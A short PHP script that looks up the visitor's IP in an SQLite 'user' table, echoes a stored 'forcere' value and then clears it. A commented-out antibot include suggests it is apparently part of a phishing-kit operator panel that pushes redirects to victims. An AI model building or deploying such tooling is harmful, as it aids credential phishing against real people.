<?php
//require_once('../antibot8/code/include.php');
session_start();
$coxfile=  "cox.php";



include $coxfile;
$userip =$_SERVER['REMOTE_ADDR'];

   $sql ="SELECT * from user where IP='$userip';";

   $ret = $db->query($sql);
   while($row = $ret->fetchArray(SQLITE3_ASSOC) ) {
      $test =$row['forcere'];
      if ($test!="") {
             $sqls ="UPDATE user set  forcere ='' , done ='' where IP='$userip';";
            $db->exec($sqls);
             echo $test;
         }

      }

   $db->close();



?>
